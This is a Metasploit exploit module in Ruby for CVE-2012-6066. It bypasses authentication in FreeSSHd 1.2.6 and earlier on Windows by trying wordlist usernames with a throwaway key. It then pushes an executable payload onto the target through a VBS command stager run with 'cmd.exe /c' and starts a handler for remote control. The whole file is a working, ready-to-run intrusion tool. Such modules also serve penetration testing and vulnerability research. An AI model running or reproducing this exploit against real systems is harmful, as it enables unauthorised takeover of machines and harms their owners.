##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Freesshd Authentication Bypass",
      'Description'    => %q{
          This module exploits a vulnerability found in FreeSSHd <= 1.2.6 to bypass
        authentication. You just need the username (which defaults to root). The exploit
        has been tested with both password and public key authentication.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Aris', # Vulnerability discovery and Exploit
          'kcope', # 2012 Exploit
          'Daniele Martini <cyrax[at]pkcrew.org>' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2012-6066' ],
          [ 'OSVDB', '88006' ],
          [ 'BID', '56785' ],
          [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2012-12/0012.html' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2010/Aug/132' ]
        ],
      'Platform'       => 'win',
      'Privileged'     => true,
      'DisclosureDate' => "Aug 11 2010",
      'Targets' =>
        [
          [ 'Freesshd <= 1.2.6 / Windows (Universal)', {} ]
        ],
      'DefaultTarget' => 0
    ))

    register_options(
      [
        Opt::RPORT(22),
        OptString.new('USERNAME', [false, 'A specific username to try']),
        OptPath.new(
          'USER_FILE',
          [ true, "File containing usernames, one per line",
          # Defaults to unix_users.txt, because this is the closest one we can try
          File.join(Msf::Config.data_directory, "wordlists", "unix_users.txt") ]
        )
      ], self.class)

  end

  def load_netssh
    begin
      require 'net/ssh'
      return true
    rescue LoadError
      return false
    end
  end

  def check
    connect
    banner = sock.recv(30)
    disconnect
    if banner =~ /SSH\-2\.0\-WeOnlyDo/
      version=banner.split(" ")[1]
      return Exploit::CheckCode::Appears if version =~ /(2\.1\.3|2\.0\.6)/
      return Exploit::CheckCode::Detected
    end
    return Exploit::CheckCode::Safe
  end


  def upload_payload(connection)
    exe = generate_payload_exe
    filename = rand_text_alpha(8) + ".exe"
    cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
    opts = {
      :linemax => 1700,
      :decoder => File.join(Msf::Config.data_directory, "exploits", "cmdstager", "vbs_b64"),
    }

    cmds = cmdstager.generate(opts)

    if (cmds.nil? or cmds.length < 1)
      print_error("The command stager could not be generated")
      raise ArgumentError
    end
    cmds.each { |cmd|
      connection.exec!("cmd.exe /c "+cmd)
    }
  end

  def setup_ssh_options
    pass=rand_text_alpha(8)
    options={
      :password => pass,
      :port     => datastore['RPORT'],
      :timeout  => 1,
      :proxies  => datastore['Proxies'],
      :key_data => OpenSSL::PKey::RSA.new(2048).to_pem,
      :auth_methods => ['publickey']
    }
    return options
  end

  def do_login(username,options)
    print_status("Trying username '#{username}'")
    options[:username]=username

    transport = Net::SSH::Transport::Session.new(datastore['RHOST'], options)
    auth = Net::SSH::Authentication::Session.new(transport, options)
    auth.authenticate("ssh-connection", username, options[:password])
    connection = Net::SSH::Connection::Session.new(transport, options)
    begin
      Timeout.timeout(10) do
        connection.exec!('cmd.exe /c echo')
      end
    rescue RuntimeError
      return nil
    rescue Timeout::Error
      print_status("Timeout")
      return nil
    end
    return connection
  end

  #
  # Cannot use the auth_brute mixin, because if we do, a payload handler won't start.
  # So we have to write our own each_user here.
  #
  def each_user(&block)
    user_list = []
    if datastore['USERNAME'] and !datastore['USERNAME'].empty?
      user_list << datastore['USERNAME']
    else
      f = File.open(datastore['USER_FILE'], 'rb')
      buf = f.read
      f.close

      user_list = (user_list | buf.split).uniq
    end

    user_list.each do |user|
      block.call(user)
    end
  end

  def exploit
    #
    # Load net/ssh so we can talk the SSH protocol
    #
    has_netssh = load_netssh
    if not has_netssh
      print_error("You don't have net/ssh installed.  Please run gem install net-ssh")
      return
    end

    options = setup_ssh_options

    connection = nil

    each_user do |username|
      next if username.empty?
      connection=do_login(username,options)
      break if connection
    end

    if connection
      print_status("Uploading payload, this may take several minutes...")
      upload_payload(connection)
      handler
    end
  end

end

